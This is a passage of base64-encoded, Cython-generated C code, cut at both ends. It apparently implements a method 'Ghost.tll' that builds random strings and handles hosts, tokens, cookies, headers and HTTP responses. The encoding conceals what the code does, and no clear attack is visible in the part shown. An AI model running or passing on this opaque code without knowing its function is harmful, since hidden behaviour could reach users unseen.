Hl4X2dlbmV4cHJfYXJnXzA7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzhnZW5lcmF0b3IyLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X3RsbF9sb2NhbHNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmKTsgaWYgKHVubGlrZWx5KCFnZW4pKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QudGxsLmdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfOGdlbmVyYXRvcjIoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeU9iamVjdCAqKCpfX3B5eF90XzMpKFB5T2JqZWN0ICopOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90Xzg7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkgewogICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjsKICAgIGRlZmF1bHQ6IAogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gTlVMTDsKICB9CiAgX19weXhfTDNfZmlyc3RfcnVuOjsKICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9yKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcikgfQogIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsKICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMDsgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF8zID0gTlVMTDsKICB9IGVsc2UgewogICAgX19weXhfdF8yID0gLTE7IF9fcHl4X3RfMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgfQogIGZvciAoOzspIHsKICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHsKICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEpKSkgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgewogICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgfQogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgICB9IGVsc2UgewogICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzMoX19weXhfdF8xKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSB7CiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTsKICAgICAgICBpZiAoZXhjX3R5cGUpIHsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzQpOwogICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUtPl9fcHl4X3Zfc2VsZikpIHsgX19QeXhfUmFpc2VDbG9zdXJlTmFtZUVycm9yKCJzZWxmIik7IF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpIH0KICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZS0+X19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzd9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MywgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgfQogICAgaWYgKHVubGlrZWx5KF9fUHl4X0xpc3RDb21wX0FwcGVuZChfX3B5eF9yLCAoUHlPYmplY3QqKV9fcHl4X3RfNCkpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHsKICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7CiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgI2VuZGlmCiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTsKICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8xMHRsbChDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmKSB7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKl9fcHl4X2N1cl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfdl9uMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfbjIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hvc3QgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfbWF0Y2ggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3RvayA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfY29va2llcyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaGVhZGVycyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZGF0YSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3RsX21hdGNoID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl90bCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzJnZW5lcmF0b3IgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfNWdlbmVyYXRvcjEgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfOGdlbmVyYXRvcjIgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIHNpemVfdCBfX3B5eF90Xzk7CiAgaW50IF9fcHl4X3RfMTA7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyWzExXTsKICBQeU9iamVjdCAqX19weXhfdF8xMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE4WzRdOwogIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDsKICBpbnQgX19weXhfdF8yMDsKICBpbnQgX19weXhfdF8yMTsKICBpbnQgX19weXhfdF8yMjsKICBjaGFyIGNvbnN0ICpfX3B5eF90XzIzOwogIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJ0bGwiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKilfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MMV9lcnJvcikKICB9IGVsc2UgewogICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgfQogIF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9zZWxmID0gX19weXhfdl9zZWxmOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3Zfc2VsZik7CiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3Zfc2VsZik7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTsKICAgICAgX19weXhfdF82ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfOH07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdF82ID0gX19weXhfcGZfMnRmXzVHaG9zdF8zdGxsX2dlbmV4cHIoKChQeU9iamVjdCopX19weXhfY3VyX3Njb3BlKSwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzYgPSBQeVVuaWNvZGVfSm9pbihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3ZfbjEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3JhbmdlKTsKICAgICAgX19weXhfdF84ID0gX19weXhfYnVpbHRpbl9yYW5nZTsgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfN307CiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIH0KICAgICAgX19weXhfdF84ID0gX19weXhfcGZfMnRmXzVHaG9zdF8zdGxsXzNnZW5leHByKCgoUHlPYmplY3QqKV9fcHl4X2N1cl9zY29wZSksIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzgpOyBpZiAodW5saWt